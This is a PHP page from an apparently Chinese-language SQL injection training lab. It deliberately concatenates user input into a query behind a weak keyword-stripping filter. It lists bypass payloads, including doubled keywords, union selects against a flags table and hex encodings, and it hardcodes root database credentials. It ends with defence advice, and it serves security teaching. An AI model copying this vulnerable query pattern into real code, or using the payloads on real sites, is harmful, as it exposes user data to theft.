<?php
// SQL注入绕过场景
// 使用真实MySQL数据库

// 数据库连接信息
$servername = "127.0.0.1";
$username = "root";
$password = "123456";
$dbname = "zhao";

// 创建连接
$conn = new mysqli($servername, $username, $password, $dbname);

// 检查连接
if ($conn->connect_error) {
    die("连接失败: " . $conn->connect_error);
}

// 初始化数据库表和数据
function initDatabase($conn) {
    // 创建users表
    $create_users_sql = "CREATE TABLE IF NOT EXISTS users (
        id INT(6) UNSIGNED AUTO_INCREMENT PRIMARY KEY,
        username VARCHAR(30) NOT NULL,
        password VARCHAR(30) NOT NULL,
        email VARCHAR(50) NOT NULL,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )";
    $conn->query($create_users_sql);
    
    // 插入模拟数据
    $insert_users_sql = "INSERT IGNORE INTO users (username, password, email) VALUES
    ('admin', 'admin123', 'admin@example.com'),
    ('user1', 'password1', 'user1@example.com')";
    $conn->query($insert_users_sql);
}

// 数据库已在init_db.php中初始化

// 简单的WAF过滤（可被绕过）
function waf($input) {
    $blacklist = [
        'union', 'select', 'from', 'where', 'and', 'or', 'sleep', 'benchmark',
        'extractvalue', 'updatexml', 'floor', 'exp', '--', '#', '/*', '*/'
    ];
    
    foreach ($blacklist as $word) {
        $input = str_ireplace($word, '', $input);
    }
    
    return $input;
}

// 模拟数据库查询函数
function query($sql, $conn) {
    // 执行查询
    $result = $conn->query($sql);
    
    if (!$result) {
        // 捕获数据库错误
        throw new Exception($conn->error);
    }
    
    $rows = [];
    while ($row = $result->fetch_assoc()) {
        $rows[] = $row;
    }
    
    return $rows;
}

$id = $_GET['id'] ?? 1;
$filtered_id = waf($id);
$results = [];
$error = '';

// 执行查询（存在SQL注入漏洞，WAF可被绕过）
$sql = "SELECT * FROM users WHERE id=$filtered_id";
try {
    $results = query($sql, $conn);
} catch (Exception $e) {
    $error = $e->getMessage();
}

// 关闭连接
$conn->close();
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SQL注入绕过 - SQL注入漏洞</title>
    <link rel="stylesheet" href="../assets/css/style.css">
    <style>
        body {
            background: linear-gradient(135deg, #a8edea 0%, #fed6e3 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1000px;
            margin: 30px auto;
        }
        .card {
            background: white;
            border-radius: 20px;
            padding: 35px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            margin-bottom: 25px;
        }
        .card h2 {
            color: #333;
            margin-bottom: 20px;
        }
        .alert-danger {
            background: linear-gradient(135deg, #ff6b6b 0%, #ee5a6f 100%);
            color: white;
            padding: 20px;
            border-radius: 12px;
            margin-bottom: 25px;
        }
        .info-section {
            background: #e8f4fd;
            border-left: 5px solid #667eea;
            padding: 20px;
            border-radius: 0 10px 10px 0;
            margin-bottom: 25px;
        }
        .query-box {
            background: #f8f9fa;
            padding: 25px;
            border-radius: 15px;
            margin: 20px 0;
        }
        .input-group {
            display: flex;
            gap: 10px;
            margin: 15px 0;
        }
        .input-group input {
            flex: 1;
            padding: 12px;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            font-size: 16px;
        }
        .btn {
            padding: 12px 25px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-weight: 600;
        }
        .sql-code {
            background: #1e1e1e;
            color: #d4d4d4;
            padding: 20px;
            border-radius: 10px;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            margin: 15px 0;
            position: relative;
        }
        .sql-code::before {
            content: "执行的SQL:";
            display: block;
            color: #ffcc00;
            margin-bottom: 10px;
        }
        .waf-info {
            background: #fff3cd;
            border: 2px solid #ffeaa7;
            color: #856404;
            padding: 15px;
            border-radius: 8px;
            margin: 15px 0;
        }
        .results-table {
            width: 100%;
            border-collapse: collapse;
            margin: 20px 0;
        }
        .results-table th,
        .results-table td {
            padding: 12px;
            text-align: left;
            border-bottom: 1px solid #dee2e6;
        }
        .results-table th {
            background: #667eea;
            color: white;
            font-weight: 600;
        }
        .payload-list {
            background: #1e1e1e;
            color: #d4d4d4;
            padding: 20px;
            border-radius: 10px;
            font-family: 'Courier New', monospace;
            font-size: 13px;
            margin: 15px 0;
        }
        .payload-list h4 {
            color: #ffcc00;
            margin-bottom: 10px;
        }
        .payload-list code {
            color: #7ee787;
            cursor: pointer;
            display: block;
            padding: 5px 0;
        }
        .flag-box {
            background: #d4edda;
            border: 2px solid #28a745;
            color: #155724;
            padding: 20px;
            border-radius: 10px;
            text-align: center;
            margin: 20px 0;
            font-family: 'Courier New', monospace;
            display: none;
        }
        .flag-box.show {
            display: block;
        }
        .back-link {
            display: inline-block;
            margin-top: 20px;
            color: #667eea;
            text-decoration: none;
            font-weight: 600;
        }
        .bypass-techniques {
            background: #f0f0f0;
            padding: 20px;
            border-radius: 10px;
            margin: 20px 0;
        }
        .bypass-techniques h4 {
            margin-bottom: 10px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <div class="alert-danger">
                <h4>🚨 SQL注入绕过漏洞</h4>
                <p>本页面存在SQL注入漏洞，虽然有简单的WAF过滤，但可以通过各种技巧绕过。</p>
            </div>
            
            <h2>5. 🔓 SQL注入绕过</h2>
            
            <div class="info-section">
                <strong>💡 漏洞说明：</strong><br>
                许多网站部署了WAF（Web应用防火墙）来防御SQL注入攻击，但如果过滤规则不够严格，攻击者可以通过各种技巧绕过这些防护。<br>
                常见的绕过方法包括：大小写混合、双写、编码、注释绕过等。<br>
                <br>
                <strong>挑战：</strong>绕过WAF的过滤，成功执行SQL注入
            </div>
        </div>

        <div class="card">
            <h3>🔍 用户查询（存在WAF过滤）</h3>
            <div class="query-box">
                <form method="GET">
                    <div class="input-group">
                        <input type="text" name="id" placeholder="输入用户ID..." value="<?php echo htmlspecialchars($id); ?>">
                        <button type="submit" class="btn">查询</button>
                    </div>
                </form>
                
                <div class="waf-info">
                    <strong>WAF过滤规则：</strong>过滤了 union, select, from, where, and, or, sleep, benchmark, extractvalue, updatexml, floor, exp, --, #, /*, */ 等关键词
                </div>
                
                <div class="sql-code">
                    <?php echo htmlspecialchars($sql); ?>
                </div>
                
                <?php if (!empty($error)): ?>
                <div class="error-box">
                    <strong>错误信息：</strong><?php echo htmlspecialchars($error); ?>
                </div>
                <?php endif; ?>
                
                <?php if (!empty($results)): ?>
                <h4>查询结果：</h4>
                <table class="results-table">
                    <thead>
                        <tr>
                            <th>ID</th>
                            <th>用户名</th>
                            <th>密码</th>
                            <th>邮箱</th>
                        </tr>
                    </thead>
                    <tbody>
                        <?php foreach ($results as $row): ?>
                        <tr>
                            <td><?php echo htmlspecialchars($row['id']); ?></td>
                            <td><?php echo htmlspecialchars($row['username']); ?></td>
                            <td><?php echo htmlspecialchars($row['password']); ?></td>
                            <td><?php echo htmlspecialchars($row['email']); ?></td>
                        </tr>
                        <?php endforeach; ?>
                    </tbody>
                </table>
                <?php else:
                    if ($id): ?>
                    <p style="color: #666; margin: 15px 0;">未找到用户</p>
                    <?php endif;
                endif; ?>
            </div>
        </div>

        <div class="card">
            <h3>🎯 绕过技巧Payload</h3>
            <div class="payload-list">
                <h4>1. 双写绕过（推荐）</h4>
                <code onclick="setId('1 ununionion seselectlect 1,2,3,4,5')">1 ununionion seselectlect 1,2,3,4,5</code>
                <p style="color: #888; font-size: 12px;">原理：un<span style="color: #ff6b6b;">union</span>ion → union</p>
                
                <h4>2. 查询所有用户（双写绕过）</h4>
                <code onclick="setId('1 oorr 1=1')">1 oorr 1=1</code>
                <p style="color: #888; font-size: 12px;">原理：o<span style="color: #ff6b6b;">or</span>r → or</p>
                
                <h4>3. 查询flag表（双写绕过）</h4>
                <code onclick="setId('0 ununionion seselectlect id,flag,description,flag,created_at frfromom flags')">0 ununionion seselectlect id,flag,description,flag,created_at frfromom flags</code>
                
                <h4>4. 其他双写技巧</h4>
                <code onclick="setId('1 anandd 1=1')">1 anandd 1=1</code>
                <code onclick="setId('1 whewherere 1=1')">1 whewherere 1=1</code>
                <p style="color: #888; font-size: 12px;">WAF过滤列表中的关键词都可以用双写绕过</p>
                
                <h4>5. 逻辑运算符替换</h4>
                <code onclick="setId('1 || 1=1')">1 || 1=1</code>
                <code onclick="setId('1 && 1=1')">1 && 1=1</code>
                <p style="color: #888; font-size: 12px;">使用 || 代替 OR，&& 代替 AND</p>
                
                <h4>6. 十六进制编码</h4>
                <code onclick="setId('0 ununionion seselectlect 1,2,3,4,5 frfromom 0x666c616773')">0 ununionion seselectlect 1,2,3,4,5 frfromom 0x666c616773</code>
                <p style="color: #888; font-size: 12px;">0x666c616773 = 'flags' 的十六进制编码</p>
                
                <h4>7. CONCAT分割</h4>
                <code onclick="setId('0 ununionion seselectlect 1,2,3,4,5 frfromom CONCAT(CHAR(102),CHAR(108),CHAR(97),CHAR(103),CHAR(115))')">0 ununionion seselectlect 1,2,3,4,5 frfromom CONCAT(CHAR(102),CHAR(108),CHAR(97),CHAR(103),CHAR(115))</code>
                <p style="color: #888; font-size: 12px;">使用CHAR函数构造表名绕过关键词检测</p>
            </div>
            
            <div class="bypass-techniques">
                <h4>🔓 完整绕过技术列表</h4>
                <table style="width: 100%; border-collapse: collapse; margin-top: 15px;">
                    <thead>
                        <tr style="background: #667eea; color: white;">
                            <th style="padding: 10px; text-align: left;">绕过技术</th>
                            <th style="padding: 10px; text-align: left;">示例</th>
                            <th style="padding: 10px; text-align: center;">当前环境</th>
                            <th style="padding: 10px; text-align: left;">说明</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr style="background: #d4edda;">
                            <td style="padding: 10px; border-bottom: 1px solid #dee2e6;"><strong>双写绕过</strong></td>
                            <td style="padding: 10px; border-bottom: 1px solid #dee2e6;"><code>ununionion</code>、<code>seselectlect</code></td>
                            <td style="padding: 10px; border-bottom: 1px solid #dee2e6; text-align: center;">✅ 可用</td>
                            <td style="padding: 10px; border-bottom: 1px solid #dee2e6;">WAF替换一次后仍保留有效关键词</td>
                        </tr>
                        <tr style="background: #f8d7da;">
                            <td style="padding: 10px; border-bottom: 1px solid #dee2e6;"><strong>大小写混合</strong></td>
                            <td style="padding: 10px; border-bottom: 1px solid #dee2e6;"><code>UnIoN</code>、<code>SeLeCt</code></td>
                            <td style="padding: 10px; border-bottom: 1px solid #dee2e6; text-align: center;">❌ 不可用</td>
                            <td style="padding: 10px; border-bottom: 1px solid #dee2e6;">WAF使用str_ireplace，不区分大小写</td>
                        </tr>
                        <tr style="background: #f8d7da;">
                            <td style="padding: 10px; border-bottom: 1px solid #dee2e6;"><strong>注释绕过</strong></td>
                            <td style="padding: 10px; border-bottom: 1px solid #dee2e6;"><code>/*!UNION*/</code>、<code>/**/</code></td>
                            <td style="padding: 10px; border-bottom: 1px solid #dee2e6; text-align: center;">❌ 不可用</td>
                            <td style="padding: 10px; border-bottom: 1px solid #dee2e6;">/* 和 */ 被WAF过滤</td>
                        </tr>
                        <tr style="background: #f8d7da;">
                            <td style="padding: 10px; border-bottom: 1px solid #dee2e6;"><strong>内联注释</strong></td>
                            <td style="padding: 10px; border-bottom: 1px solid #dee2e6;"><code>/*!50000union*/</code></td>
                            <td style="padding: 10px; border-bottom: 1px solid #dee2e6; text-align: center;">❌ 不可用</td>
                            <td style="padding: 10px; border-bottom: 1px solid #dee2e6;">/* 被过滤，无法使用内联注释</td>
                        </tr>
                        <tr style="background: #d4edda;">
                            <td style="padding: 10px; border-bottom: 1px solid #dee2e6;"><strong>编码绕过</strong></td>
                            <td style="padding: 10px; border-bottom: 1px solid #dee2e6;">URL编码 <code>%20</code>、<code>%2b</code></td>
                            <td style="padding: 10px; border-bottom: 1px solid #dee2e6; text-align: center;">✅ 可用</td>
                            <td style="padding: 10px; border-bottom: 1px solid #dee2e6;">浏览器自动解码后WAF无法识别</td>
                        </tr>
                        <tr style="background: #d4edda;">
                            <td style="padding: 10px; border-bottom: 1px solid #dee2e6;"><strong>空格替换</strong></td>
                            <td style="padding: 10px; border-bottom: 1px solid #dee2e6;"><code>+</code>、<code>%0b</code>、<code>%0c</code></td>
                            <td style="padding: 10px; border-bottom: 1px solid #dee2e6; text-align: center;">✅ 可用</td>
                            <td style="padding: 10px; border-bottom: 1px solid #dee2e6;">使用其他空白字符替代空格</td>
                        </tr>
                        <tr style="background: #d4edda;">
                            <td style="padding: 10px; border-bottom: 1px solid #dee2e6;"><strong>逻辑运算符替换</strong></td>
                            <td style="padding: 10px; border-bottom: 1px solid #dee2e6;"><code>&&</code>代替AND、<code>||</code>代替OR</td>
                            <td style="padding: 10px; border-bottom: 1px solid #dee2e6; text-align: center;">✅ 可用</td>
                            <td style="padding: 10px; border-bottom: 1px solid #dee2e6;">使用未被过滤的逻辑运算符</td>
                        </tr>
                        <tr style="background: #d4edda;">
                            <td style="padding: 10px; border-bottom: 1px solid #dee2e6;"><strong>十六进制编码</strong></td>
                            <td style="padding: 10px; border-bottom: 1px solid #dee2e6;"><code>0x7573657273</code>代替'users'</td>
                            <td style="padding: 10px; border-bottom: 1px solid #dee2e6; text-align: center;">✅ 可用</td>
                            <td style="padding: 10px; border-bottom: 1px solid #dee2e6;">字符串使用十六进制表示</td>
                        </tr>
                        <tr style="background: #d4edda;">
                            <td style="padding: 10px; border-bottom: 1px solid #dee2e6;"><strong>CHAR函数</strong></td>
                            <td style="padding: 10px; border-bottom: 1px solid #dee2e6;"><code>CHAR(117,115,101,114,115)</code></td>
                            <td style="padding: 10px; border-bottom: 1px solid #dee2e6; text-align: center;">✅ 可用</td>
                            <td style="padding: 10px; border-bottom: 1px solid #dee2e6;">使用CHAR函数构造字符串</td>
                        </tr>
                        <tr style="background: #d4edda;">
                            <td style="padding: 10px; border-bottom: 1px solid #dee2e6;"><strong>CONCAT函数</strong></td>
                            <td style="padding: 10px; border-bottom: 1px solid #dee2e6;"><code>CONCAT('fl','ags')</code></td>
                            <td style="padding: 10px; border-bottom: 1px solid #dee2e6; text-align: center;">✅ 可用</td>
                            <td style="padding: 10px; border-bottom: 1px solid #dee2e6;">分割关键词避免被检测</td>
                        </tr>
                        <tr style="background: #f8d7da;">
                            <td style="padding: 10px; border-bottom: 1px solid #dee2e6;"><strong>单行注释</strong></td>
                            <td style="padding: 10px; border-bottom: 1px solid #dee2e6;"><code>--</code>、<code>#</code></td>
                            <td style="padding: 10px; border-bottom: 1px solid #dee2e6; text-align: center;">❌ 不可用</td>
                            <td style="padding: 10px; border-bottom: 1px solid #dee2e6;">-- 和 # 被WAF过滤</td>
                        </tr>
                        <tr style="background: #d4edda;">
                            <td style="padding: 10px; border-bottom: 1px solid #dee2e6;"><strong>反引号</strong></td>
                            <td style="padding: 10px; border-bottom: 1px solid #dee2e6;"><code>`table_name`</code></td>
                            <td style="padding: 10px; border-bottom: 1px solid #dee2e6; text-align: center;">✅ 可用</td>
                            <td style="padding: 10px; border-bottom: 1px solid #dee2e6;">使用反引号包裹标识符</td>
                        </tr>
                        <tr style="background: #d4edda;">
                            <td style="padding: 10px; border-bottom: 1px solid #dee2e6;"><strong>括号绕过</strong></td>
                            <td style="padding: 10px; border-bottom: 1px solid #dee2e6;"><code>(select 1)</code>、<code>(1)</code></td>
                            <td style="padding: 10px; border-bottom: 1px solid #dee2e6; text-align: center;">✅ 可用</td>
                            <td style="padding: 10px; border-bottom: 1px solid #dee2e6;">使用括号改变语法结构</td>
                        </tr>
                    </tbody>
                </table>
            </div>
        </div>

        <div class="card">
            <h3>🛡️ 防御方法</h3>
            <div class="info-section">
                1. <strong>参数化查询：</strong>这是最有效的防御方法，从根本上防止SQL注入<br>
                2. <strong>专业WAF：</strong>使用专业的Web应用防火墙，定期更新规则<br>
                3. <strong>输入验证：</strong>对用户输入进行严格的类型检查和白名单过滤<br>
                4. <strong>最小权限：</strong>限制数据库用户权限<br>
                5. <strong>代码审计：</strong>定期进行代码安全审计
            </div>
            
            <a href="index.php" class="back-link">← 返回SQL注入模块首页</a>
        </div>
    </div>

    <script>
        function setId(payload) {
            document.querySelector('input[name="id"]').value = payload;
        }
    </script>
</body>
</html>
